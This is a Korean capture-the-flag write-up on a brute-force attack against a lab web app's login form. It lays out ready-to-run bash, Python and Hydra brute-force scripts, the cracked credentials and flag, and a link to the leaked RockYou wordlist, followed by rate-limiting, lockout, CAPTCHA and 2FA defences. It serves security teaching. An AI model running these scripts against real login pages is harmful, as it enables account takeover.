# 취약점 #4: 로그인 폼 무차별 대입 공격 (Brute Force)

## 🎯 취약점 유형
**Brute Force Attack - 속도 제한 없음**
- **OWASP 분류**: A07:2021 - Identification and Authentication Failures (식별 및 인증 실패)
- **CWE 분류**: CWE-307 - 과도한 인증 시도에 대한 부적절한 제한

---

## 🔍 취약점 발견 과정

### 발견: 로그인 페이지
**URL**: `http://192.168.64.2/index.php?page=signin`

이 페이지는 사용자 이름과 비밀번호 입력 필드가 있는 간단한 로그인 폼을 제공합니다.

![로그인 폼](images/01-login-form.png)

### 1단계: 흔한 인증 정보 테스트
일반적인 사용자 이름/비밀번호 조합을 시도했습니다:

**시도한 일반적인 사용자 이름**:
- `admin`
- `root`
- `administrator`
- `user`
- `guest`

**흔한 비밀번호로 테스트**:
```bash
curl "http://192.168.64.2/index.php?page=signin&username=admin&password=password&Login=Login"
```

결과: 실패 (WrongAnswer.gif 표시됨)

### 2단계: 자동화된 무차별 대입 공격
속도 제한이나 계정 잠금이 없었기 때문에, 흔한 비밀번호 리스트를 사용하여 무차별 대입 공격을 수행했습니다.

**비밀번호 리스트 출처**:
1. **Wikipedia**: [가장 흔한 비밀번호 목록](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)
2. **SecLists**: [darkweb2017_top-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/darkweb2017_top-1000.txt)
3. **RockYou**: 유명한 비밀번호 유출 데이터베이스

**가장 흔한 비밀번호 Top 20** (Wikipedia/SplashData 연구 기반):
```
1.  123456
2.  password
3.  12345678
4.  qwerty
5.  123456789
6.  12345
7.  1234
8.  111111
9.  1234567
10. dragon
11. 123123
12. baseball
13. iloveyou
14. trustno1
15. 1234567890
16. sunshine
17. master
18. shadow      ← 이게 작동합니다!
19. ashley
20. bailey
```

**출처 상세**:
- **SplashData** (2011-2018): 매년 가장 흔한 비밀번호 보고서 발표
- **데이터 기반**: 실제 데이터 유출 사건에서 수집된 수백만 개의 비밀번호
- **연구 목적**: 보안 인식 향상 및 비밀번호 정책 개선

### 3단계: 성공!
**발견된 유효한 인증 정보**:
- 사용자 이름: `admin`
- 비밀번호: `shadow`
- 시도 횟수: #18 (상위 20개 중)

![성공적인 로그인과 플래그](images/02-flag-success.png)

**Flag**: `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

### 관찰 사항

**감지된 보안 조치 없음**:
- ❌ 속도 제한 없음
- ❌ 실패 후 계정 잠금 없음
- ❌ CAPTCHA 없음
- ❌ 시도 간 지연 없음
- ❌ IP 기반 차단 없음
- ❌ 2FA (이중 인증) 없음

**공격 속도**:
- 초당 시도 횟수: ~10 (0.1초 지연 사용 시)
- 비밀번호 발견 시간: ~2초
- 지연 없이: 초당 1000개 이상의 비밀번호 테스트 가능

**왜 이렇게 빠른가?**
```
지연 없음 = 네트워크 속도만 제한
1초에 10번 요청 = 1분에 600개 비밀번호
1분에 600개 = 1시간에 36,000개
상위 1000개 비밀번호 = 약 2분이면 테스트 완료!
```

---

## 💥 공격 방법 (재현)

### 수동 공격

```bash
# 발견된 인증 정보 테스트
curl "http://192.168.64.2/index.php?page=signin&username=admin&password=shadow&Login=Login" | grep -i flag
```

### 자동화된 무차별 대입 스크립트

**Bash 스크립트** (`bruteforce.sh`):
```bash
#!/bin/bash

TARGET="http://192.168.64.2/index.php?page=signin"

USERNAMES=("admin" "root" "user" "administrator")
PASSWORDS=("123456" "password" "qwerty" "shadow" "dragon")

for username in "${USERNAMES[@]}"; do
    for password in "${PASSWORDS[@]}"; do
        RESPONSE=$(curl -s "${TARGET}&username=${username}&password=${password}&Login=Login")

        if echo "$RESPONSE" | grep -q "The flag is"; then
            echo "✅ 성공: $username:$password"
            echo "$RESPONSE" | grep -oP 'The flag is : \K[a-f0-9]+'
            exit 0
        else
            echo "❌ 실패: $username:$password"
        fi

        sleep 0.1  # 작은 지연
    done
done
```

**실행 방법**:
```bash
chmod +x bruteforce.sh
./bruteforce.sh
```

**예상 출력**:
```
❌ 실패: admin:123456
❌ 실패: admin:password
❌ 실패: admin:qwerty
✅ 성공: admin:shadow
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

### Python 스크립트 (더 정교함)

```python
import requests
import time

TARGET = "http://192.168.64.2/index.php"

# SecLists의 상위 비밀번호
with open('darkweb2017_top-1000.txt', 'r') as f:
    passwords = [line.strip() for line in f]

usernames = ['admin', 'root', 'user', 'administrator']

for username in usernames:
    for i, password in enumerate(passwords):
        params = {
            'page': 'signin',
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        response = requests.get(TARGET, params=params)

        if 'The flag is' in response.text:
            print(f"✅ 시도 {i+1}번에 성공")
            print(f"   사용자 이름: {username}")
            print(f"   비밀번호: {password}")

            # Flag 추출
            import re
            flag = re.search(r'The flag is : ([a-f0-9]+)', response.text)
            if flag:
                print(f"   Flag: {flag.group(1)}")

            exit(0)
        else:
            print(f"❌ 시도 {i+1}: {username}:{password}")

        time.sleep(0.1)  # 속도 제한
```

### Hydra 사용 (전문 도구)

```bash
# Hydra 설치
sudo apt-get install hydra

# 비밀번호 리스트 생성
cat > passwords.txt << EOF
123456
password
shadow
dragon
EOF

# Hydra 실행
hydra -l admin -P passwords.txt \
    http-get-form \
    "192.168.64.2:80:/?page=signin&username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif"
```

**Hydra 출력 예시**:
```
[80][http-get-form] host: 192.168.64.2   login: admin   password: shadow
1 of 1 target successfully completed, 1 valid password found
```

---

## 🛡️ 보안 문제 분석

### 1️⃣ 속도 제한 없음

**문제점**: 단일 IP에서 무제한 로그인 시도 허용.

**영향**:
- 공격자가 분당 수천 개의 비밀번호를 시도할 수 있음
- 무차별 대입 공격이 매우 쉬움
- 실패한 시도에 대한 시간 패널티 없음

**실제 테스트**:
```bash
# 0.1초 지연으로 100개 비밀번호 테스트 = ~10초
# 0.1초 지연으로 1000개 비밀번호 테스트 = ~100초
# 0.1초 지연으로 10000개 비밀번호 테스트 = ~16분

# 지연 없이:
# 초당 100개 비밀번호 = 1000개는 10초만에!
```

### 2️⃣ 약한 비밀번호

**문제점**: 비밀번호 "shadow"는 가장 흔한 비밀번호 목록의 #18입니다.

**왜 약한가**:
- 단일 사전 단어
- 숫자나 특수 문자 없음
- 모든 비밀번호 크랙 워드리스트에 포함됨
- 흔한 비밀번호 데이터셋의 일부

**비밀번호 강도 비교**:
```
❌ 매우 약함:  shadow
❌ 약함:      Shadow123
⚠️  중간:     Sh@dow123!
✅ 강함:      X9$mK2#nP7@wL5&tR8!

크랙 시간 예상:
shadow       → 즉시 (데이터베이스에 있음)
Shadow123    → 몇 초 (패턴 예측 가능)
Sh@dow123!   → 몇 시간 (복잡하지만 여전히 패턴)
X9$...R8!    → 수백만 년 (완전 랜덤)
```

**통계**:
- 전체 비밀번호 유출의 **86%**가 상위 1000개 비밀번호에 포함
- "shadow"는 상위 20개 안에 포함
- 공격자가 상위 100개만 시도해도 성공률 **~60%**

### 3️⃣ 계정 잠금 없음

**문제점**: 여러 번 실패해도 계정이 절대 잠기지 않습니다.

**표준 관행**:
- 3-5번 실패 후 잠금
- 임시 잠금 (15분)
- 또는 점진적 지연 (1초, 2초, 4초, 8초...)

**계정 잠금의 이점**:
```
잠금 없음:
- 시도 1: 실패
- 시도 2: 실패
- 시도 3: 실패
- 시도 1000: 실패
- 시도 1001: 실패 (끝없이 계속...)

잠금 있음:
- 시도 1: 실패
- 시도 2: 실패
- 시도 3: 실패
- 시도 4: 실패
- 시도 5: 실패
→ 계정 15분간 잠금!
→ 공격자가 15분 기다려야 함
→ 무차별 대입이 비실용적으로 느려짐
```

### 4️⃣ CAPTCHA 없음

**문제점**: 자동화된 공격을 방지하는 메커니즘이 없습니다.

**CAPTCHA가 도움이 되는 이유**:
- 자동화된 스크립트를 느리게 만듦
- 무차별 대입 비용 증가
- 일반 공격자를 저지함

**CAPTCHA 종류**:
```
reCAPTCHA v2: "로봇이 아닙니다" 체크박스
reCAPTCHA v3: 백그라운드 점수 (사용자에게 보이지 않음)
hCaptcha: 개인정보 보호 중심 대안
Simple Math: 간단한 수학 문제 (기본적이지만 효과적)
```

### 5️⃣ 예측 가능한 사용자 이름

**문제점**: "admin"은 가장 흔한 관리자 사용자 이름입니다.

**흔한 사용자 이름들**:
1. admin
2. administrator
3. root
4. user
5. guest
6. test
7. demo

**대안**:
- 사용자 이름 대신 이메일 주소 사용
- 랜덤 사용자 이름 생성
- 사용자 이름 존재 여부를 드러내지 않기

**나쁜 vs 좋은 에러 메시지**:
```
❌ 나쁨: "사용자 이름을 찾을 수 없습니다"
        (사용자 이름이 존재하지 않음을 알려줌)

❌ 나쁨: "잘못된 비밀번호"
        (사용자 이름은 존재함을 알려줌)

✅ 좋음: "유효하지 않은 사용자 이름 또는 비밀번호"
        (어느 것이 틀렸는지 알 수 없음)
```

---

## 🔧 해결 방법 (Mitigation)

### 1️⃣ 속도 제한 구현

**애플리케이션 레벨** (PHP):
```php
session_start();

// 실패한 시도 추적
if (!isset($_SESSION['failed_attempts'])) {
    $_SESSION['failed_attempts'] = 0;
    $_SESSION['last_attempt'] = time();
}

// 너무 많은 시도 확인
if ($_SESSION['failed_attempts'] >= 5) {
    $time_passed = time() - $_SESSION['last_attempt'];

    if ($time_passed < 900) {  // 15분
        $wait_time = 900 - $time_passed;
        die("너무 많은 실패한 시도. {$wait_time}초 후에 다시 시도하세요.");
    } else {
        // 대기 시간 후 리셋
        $_SESSION['failed_attempts'] = 0;
    }
}

// 로그인 처리
if (login_failed()) {
    $_SESSION['failed_attempts']++;
    $_SESSION['last_attempt'] = time();
}
```

**웹 서버 레벨** (Nginx):
```nginx
# 로그인 엔드포인트 속도 제한
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

location /index.php {
    if ($arg_page = "signin") {
        limit_req zone=login burst=3 nodelay;
    }
}
```

**설명**:
- `rate=5r/m`: 분당 5번의 요청만 허용
- `burst=3`: 3번까지 순간적으로 허용 (버스트)
- `nodelay`: 즉시 처리 (대기열 없음)

**웹 애플리케이션 방화벽** (ModSecurity):
```apache
# 무차별 대입 탐지
SecAction "id:1,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR}"

<LocationMatch "/signin">
    SecRule RESPONSE_BODY "WrongAnswer" \
        "phase:4,id:2,setvar:ip.login_failures=+1,expirevar:ip.login_failures=60"

    SecRule IP:LOGIN_FAILURES "@gt 5" \
        "phase:1,id:3,deny,status:403,msg:'무차별 대입 공격 탐지'"
</LocationMatch>
```

### 2️⃣ 계정 잠금 구현

**데이터베이스 스키마**:
```sql
CREATE TABLE login_attempts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255),
    ip_address VARCHAR(45),
    attempt_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    success BOOLEAN DEFAULT FALSE,
    INDEX idx_username_time (username, attempt_time),
    INDEX idx_ip_time (ip_address, attempt_time)
);
```

**PHP 구현**:
```php
// 계정이 잠겼는지 확인
function isAccountLocked($username) {
    global $pdo;

    $stmt = $pdo->prepare("
        SELECT COUNT(*) as attempts
        FROM login_attempts
        WHERE username = ?
        AND success = FALSE
        AND attempt_time > DATE_SUB(NOW(), INTERVAL 15 MINUTE)
    ");
    $stmt->execute([$username]);
    $result = $stmt->fetch();

    return $result['attempts'] >= 5;
}

// 로그인 시도 기록
function logLoginAttempt($username, $ip, $success) {
    global $pdo;

    $stmt = $pdo->prepare("
        INSERT INTO login_attempts (username, ip_address, success)
        VALUES (?, ?, ?)
    ");
    $stmt->execute([$username, $ip, $success]);
}

// 사용법
if (isAccountLocked($username)) {
    die("너무 많은 실패한 시도로 인해 계정이 임시로 잠겼습니다. 15분 후에 다시 시도하세요.");
}

// 로그인 시도 후
logLoginAttempt($username, $_SERVER['REMOTE_ADDR'], $login_success);
```

### 3️⃣ CAPTCHA 추가

**Google reCAPTCHA v3**:
```html
<!-- HTML -->
<form method="POST" action="/index.php?page=signin">
    <input type="text" name="username" placeholder="사용자 이름" required>
    <input type="password" name="password" placeholder="비밀번호" required>

    <!-- reCAPTCHA v3 스크립트 -->
    <script src="https://www.google.com/recaptcha/api.js?render=your-site-key"></script>
    <script>
        grecaptcha.ready(function() {
            grecaptcha.execute('your-site-key', {action: 'login'}).then(function(token) {
                document.getElementById('recaptcha_token').value = token;
            });
        });
    </script>

    <input type="hidden" id="recaptcha_token" name="recaptcha_token">
    <button type="submit">로그인</button>
</form>
```

**PHP 검증**:
```php
function verifyCaptcha($token) {
    $secret = "your-secret-key";
    $response = file_get_contents(
        "https://www.google.com/recaptcha/api/siteverify?secret={$secret}&response={$token}"
    );
    $data = json_decode($response);

    // reCAPTCHA v3는 점수를 반환 (0.0 ~ 1.0)
    // 0.5 이상이면 정상 사용자로 간주
    return $data->success && $data->score >= 0.5;
}

if (!verifyCaptcha($_POST['recaptcha_token'])) {
    die("CAPTCHA 검증 실패. 로봇으로 감지되었습니다.");
}
```

### 4️⃣ 강력한 비밀번호 정책 강제

```php
function validatePassword($password) {
    $errors = [];

    // 최소 길이
    if (strlen($password) < 12) {
        $errors[] = "비밀번호는 최소 12자 이상이어야 합니다";
    }

    // 대문자 포함 필수
    if (!preg_match('/[A-Z]/', $password)) {
        $errors[] = "비밀번호에 대문자가 포함되어야 합니다";
    }

    // 소문자 포함 필수
    if (!preg_match('/[a-z]/', $password)) {
        $errors[] = "비밀번호에 소문자가 포함되어야 합니다";
    }

    // 숫자 포함 필수
    if (!preg_match('/[0-9]/', $password)) {
        $errors[] = "비밀번호에 숫자가 포함되어야 합니다";
    }

    // 특수 문자 포함 필수
    if (!preg_match('/[^A-Za-z0-9]/', $password)) {
        $errors[] = "비밀번호에 특수 문자가 포함되어야 합니다";
    }

    // 흔한 비밀번호 확인
    $common_passwords = file('common-passwords.txt', FILE_IGNORE_NEW_LINES);
    if (in_array(strtolower($password), array_map('strtolower', $common_passwords))) {
        $errors[] = "이 비밀번호는 너무 흔합니다";
    }

    // Have I Been Pwned API로 유출된 비밀번호 확인
    $hash = strtoupper(sha1($password));
    $prefix = substr($hash, 0, 5);
    $suffix = substr($hash, 5);

    $response = file_get_contents("https://api.pwnedpasswords.com/range/$prefix");
    if (strpos($response, $suffix) !== false) {
        $errors[] = "이 비밀번호는 데이터 유출에서 발견되었습니다";
    }

    return $errors;
}

// 사용 예시
$errors = validatePassword($_POST['password']);
if (!empty($errors)) {
    foreach ($errors as $error) {
        echo "- $error\n";
    }
    die();
}
```

### 5️⃣ 이중 인증 (2FA) 구현

```php
// Google Authenticator 라이브러리 사용
use PHPGangsta\GoogleAuthenticator;

$ga = new GoogleAuthenticator();

// 사용자를 위한 시크릿 생성
$secret = $ga->createSecret();

// 사용자가 스캔할 QR 코드 생성
$qrCodeUrl = $ga->getQRCodeGoogleUrl('YourApp', $secret);

echo '<img src="' . $qrCodeUrl . '">';

// 로그인 시 코드 검증
$code = $_POST['2fa_code'];
$valid = $ga->verifyCode($secret, $code, 2);  // 2 = 2*30초 시계 허용 오차

if (!$valid) {
    die("유효하지 않은 2FA 코드");
}
```

**2FA 플로우**:
```
1. 사용자가 비밀번호 입력
2. 비밀번호 검증 성공
3. 2FA 코드 요청
4. 사용자가 Google Authenticator 앱에서 코드 확인
5. 코드 입력
6. 코드 검증
7. 로그인 성공!
```

### 6️⃣ 점진적 지연 추가

```php
function getLoginDelay($failed_attempts) {
    // 점진적 지연: 0초, 1초, 2초, 4초, 8초, 16초...
    if ($failed_attempts == 0) return 0;

    $delay = pow(2, $failed_attempts - 1);

    // 최대 30초로 제한
    return min($delay, 30);
}

$delay = getLoginDelay($_SESSION['failed_attempts']);
if ($delay > 0) {
    echo "너무 많은 실패한 시도. {$delay}초 기다려주세요...";
    sleep($delay);
}
```

**효과**:
```
시도 1: 0초 지연
시도 2: 1초 지연
시도 3: 2초 지연
시도 4: 4초 지연
시도 5: 8초 지연
시도 6: 16초 지연
시도 7+: 30초 지연 (최대)

100개 비밀번호 테스트:
- 지연 없음: 10초
- 점진적 지연: 수 시간!
```

### 7️⃣ 계정 존재 여부 드러내지 않기

```php
// ❌ 나쁨: 사용자 이름 존재 여부 드러냄
if (!userExists($username)) {
    die("사용자 이름을 찾을 수 없습니다");
}

if (!passwordMatches($username, $password)) {
    die("잘못된 비밀번호");
}

// ✅ 좋음: 일반적인 에러 메시지
if (!userExists($username) || !passwordMatches($username, $password)) {
    // 같은 시간 지연으로 타이밍 공격 방지
    usleep(random_int(100000, 300000));  // 0.1~0.3초

    die("유효하지 않은 사용자 이름 또는 비밀번호");
}
```

---

## 📊 영향 평가

### CVSS 3.1 점수: 8.1 (높음)

**공격 벡터 (AV)**: Network - 네트워크를 통해 원격 공격 가능
**공격 복잡도 (AC)**: Low - 매우 쉽게 공격 가능
**필요 권한 (PR)**: None - 인증 불필요
**사용자 상호작용 (UI)**: None - 자동화 가능
**범위 (S)**: Unchanged - 동일 범위 내
**기밀성 (C)**: High - 모든 계정 데이터 접근
**무결성 (I)**: High - 데이터 변조 가능
**가용성 (A)**: Low - 서비스 중단은 제한적

### 실제 영향

**성공적인 무차별 대입으로 가능한 것**:
- 완전한 계정 탈취
- 민감한 사용자 데이터 접근
- 사용자로서 작업 수행
- 시스템 내 측면 이동 가능성

**공격 통계** (가상):
```
시도한 비밀번호: 18개
소요 시간: 2초
성공률: 100%
공격자 비용: $0
방어 비용: 계정 탈취 후 막대한 피해
```

---

## 📚 비밀번호 리스트 출처

### 주요 출처

1. **Wikipedia - 가장 흔한 비밀번호 목록**
   - URL: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
   - 기반: SplashData 연례 보고서, 데이터 유출 분석
   - 업데이트: 매년

2. **SecLists by Daniel Miessler**
   - 저장소: https://github.com/danielmiessler/SecLists
   - 파일: `Passwords/Common-Credentials/darkweb2017_top-1000.txt`
   - 파일: `Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`
   - 라이센스: MIT

3. **RockYou 비밀번호 목록**
   - 출처: 2009년 RockYou 데이터 유출 (3200만 개 비밀번호)
   - URL: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   - 참고: 보안 연구에서 가장 유명한 비밀번호 목록

4. **Have I Been Pwned**
   - URL: https://haveibeenpwned.com/Passwords
   - 포함: 실제 유출에서 6억 개 이상의 비밀번호
   - API: 비밀번호가 유출되었는지 확인 가능

### 연구 논문

- **"The Tangled Web of Password Reuse"** (2014) - Carnegie Mellon University
  - 비밀번호 재사용 패턴 연구

- **"Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks"** (2016)
  - 신경망을 사용한 비밀번호 추측 가능성 모델링

### 통계

**SplashData 2018 보고서**:
- 분석된 비밀번호: 5백만 개 이상
- 데이터 출처: 실제 데이터 유출 사건
- 상위 25개 비밀번호가 전체의 **10%** 차지

**일반적인 비밀번호 패턴**:
1. 숫자만: 123456, 111111
2. 키보드 패턴: qwerty, asdfgh
3. 단어: password, login, welcome
4. 이름: ashley, michael, jennifer
5. 단어+숫자: password123, hello123

---

## 📖 참고 자료

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [OWASP Testing for Weak Password Policy](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)

---

## 🛠️ 사용된 도구

- **curl**: 커맨드라인 테스트
- **Custom bash script**: 자동화된 무차별 대입
- **SecLists**: 비밀번호 워드리스트
- **Wikipedia**: 흔한 비밀번호 연구

---

## 🎓 핵심 교훈

### 무차별 대입 공격의 현실:
- 속도 제한이 없으면 **수초 안에** 흔한 비밀번호 발견
- 상위 100개 비밀번호로 **60% 이상** 계정 침투 가능
- 완전 자동화 가능 - 공격자가 잠자는 동안에도 실행

### 방어의 핵심:
1. **속도 제한**: 가장 중요! 분당 5번 이하로 제한
2. **계정 잠금**: 5번 실패 후 15분 잠금
3. **강력한 비밀번호**: 최소 12자, 복잡성 요구
4. **2FA**: 비밀번호가 유출되어도 안전
5. **모니터링**: 의심스러운 패턴 탐지

### 개발자를 위한 조언:
- 보안은 "나중에" 추가할 수 없습니다
- 속도 제한은 **선택이 아닌 필수**
- 흔한 비밀번호를 차단하세요
- 사용자에게 비밀번호 관리자 사용 권장

---

**Flag**: `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

---
**발견 일시**: 2025년 11월 3일
**심각도**: HIGH (높음)
**재현 난이도**: 매우 쉬움
**CVSS 점수**: 8.1/10
**공격 소요 시간**: ~2초
